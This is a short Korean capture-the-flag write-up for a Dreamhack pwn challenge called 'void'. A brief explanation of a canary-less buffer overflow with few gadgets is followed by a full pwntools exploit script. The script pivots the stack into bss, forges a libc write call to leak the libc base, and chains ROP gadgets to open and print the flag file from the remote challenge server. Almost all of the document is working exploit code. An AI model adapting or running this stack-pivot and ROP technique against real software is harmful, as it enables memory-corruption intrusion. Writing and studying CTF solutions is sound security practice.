익스 코드를 봐도 내가 아니며 코드의 의도를 알 수 없기 때문에 흐름을 써보겠다.
`bof`가 조금 나고 카나리가 없다. 바이너리 pie가 없긴 한데 쓸만한 가젯이 없다. 일단 내가 보기엔 없어보였다. 그래서 `pop rdi` 문제처럼 `bss`에 `libc` 함수를 하나 만들어서 쓴다. 여러 가지가 가능할 거 같아서 어떤 함수를 만들까 고민했는데 간단하게 `write` 함수를 만들어서 `libc` 릭을 할려고 했다. `libc_base`를 출력하기 전까지의 코드는 거의 다 이 

# exploit

```python
from pwn import *
from time import *

context.terminal = ['tmux', 'splitw', '-h']

#p = process('./void')
p = remote('host1.dreamhack.games', 10710)
e = ELF('./void')
l = ELF('./libc.so.6')
bss = e.bss() + 0x1000
main = 0x4013C8
leave_ret = 0x40137e

def main_func(num : int, payload : bytes):
    sleep(0.5)
    p.sendline(str(num).encode())
    sleep(0.5)
    p.send(payload)

payload = b'a' * 0x70 + p64(bss + 0x3500) + p64(main + 0x32)
main_func(1, payload)

payload = b'a' * 0x70 + p64(bss + 0x2500) + p64(main + 0x32) + p64(bss + 0x1000) + p64(main + 8)
main_func(1, payload)

payload = b'a' * 0x70 + p64(bss + 0x1500) + p64(main + 0x32) + p64(bss + 0x3510) + p64(leave_ret)
main_func(1, payload)

payload = p64(main + 5) * 14 + p64(bss + 0x500) + p64(main + 0x32)
main_func(1, payload)

payload = b'a' * 0x70 + p64(bss + 0x700) + p64(main + 0x32)
main_func(1, payload)

payload = b'a' * 0x30 + (p64(bss + 0x5d0) + p64(main + 0x32)) + (p64(bss + 0x5e0) + p64(main + 0x32)) + b'a' * 0x10 + (p64(bss + 0x600) + p64(main + 0x32)) + p64(bss + 0x500) + p64(main + 0x1c) + p64(bss + 0x620) + p64(main + 0x32)
main_func(1, payload)

payload = b'a' * 0x70 + p64(bss + 0x700 + 0x10) + p64(leave_ret)
main_func(1, payload)

payload1 = (l.sym['write'] + 46 - (0x00007f3085641117 - 0x7f308552c000)) & ((1 << 32) - 1)
# 0x000000000040121c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
payload2 = b'a' * 0x70 + p64(0x406488 + 0x3d) + p64(0x000000000040121c) + p64(main)
main_func(payload1, payload2)

payload = b'a' * 0x70 + p64(0x4056e0) + p64(leave_ret)
main_func(1, payload)

payload1 = -0x19999999 & ((1 << 32) - 1)
payload2 = b'a' * 0x70 + p64(0x406494 + 0x3d) + p64(0x000000000040121c) + p64(main)
main_func(payload1, payload2)

payload = b'a' * 0x70 + p64(0x4056f0) + p64(leave_ret)
main_func(1, payload)

payload1 = (main - 0x99999999) & ((1 << 32) - 1)
payload2 = b'a' * 0x70 + p64(0x406490 + 0x3d) + p64(0x000000000040121c) + p64(main)
main_func(payload1, payload2)

payload = b'a' * 0x70 + p64(0x405710) + p64(leave_ret)
main_func(1, payload)

payload1 = 8
payload2 = b'a' * 0x70 + p64(0x4064a8 + 0x3d) + p64(0x000000000040121c) + p64(main)
main_func(payload1, payload2)

payload = b'a' * 0x70 + p64(bss + 0x700) + p64(main + 0x1c)
main_func(1, payload)

payload = b'a' * 0x70 + p64(bss + 0x500) + p64(main + 0x1c) + p64(bss + 0x620) + p64(main + 0x32)
main_func(1, payload)

payload = b'a' * 0x70 + p64(bss + 0x700 + 0x10) + p64(leave_ret)
main_func(1, payload)

payload1 = e.got['read']
payload2 = b'a' * 0x70 + p64(0x4064a0 + 0x3d) + p64(0x000000000040121c) + p64(main)
main_func(payload1, payload2)

payload = b'a' * 0x5c + p32(2 + 0x31337 - 1) + b'a' * 0x10 + p64(0x406480) + p64(leave_ret)
main_func(1, payload)
l.address = u64(p.recvn(8)) - l.sym['read']
print(hex(l.address))

pop_rax = l.address + 0x0000000000045eb0
pop_rdi = l.address + 0x000000000002a3e5
pop_rsi = l.address + 0x000000000002be51
syscall = l.address + 594838
xor_dh_80_syscall = l.address + 0x000000000009133b
ret = 0x000000000040101a

# flag : 0x4074c0
payload = p64(bss + 0x2510) + p64(pop_rdi) + p64(0x4064b8) + p64(pop_rsi) + p64(0) + p64(pop_rax) + p64(2) + p64(syscall) + p64(main + 0x50) + b'a' * 0x20 + (b'flag' + b'\x00' * 4) + p64(0x406450) + p64(leave_ret)
main_func(1, payload)

payload = p64(pop_rdi) + p64(2) + p64(pop_rsi) + p64(0x4074c0) + p64(pop_rax) + p64(1) + p64(xor_dh_80_syscall) + b'a' * 0x38 + p64(0x405fb0 - 8) + p64(leave_ret)
main_func(1, payload)
p.interactive()
```